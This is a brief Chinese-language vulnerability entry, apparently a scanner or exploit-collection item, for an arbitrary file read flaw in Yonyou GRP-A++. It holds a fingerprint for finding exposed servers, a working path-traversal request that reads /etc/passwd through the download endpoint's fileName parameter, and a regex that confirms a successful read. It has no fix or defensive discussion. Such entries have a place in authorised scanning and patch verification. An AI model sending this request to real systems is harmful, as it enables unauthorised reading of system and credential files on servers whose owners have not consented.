# 用友GRP-A++downloadfileName任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/pf/portal/login/css/fonts/style.css"`
- **请求**：`GET /ma/emp/maEmp/download?fileName=../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$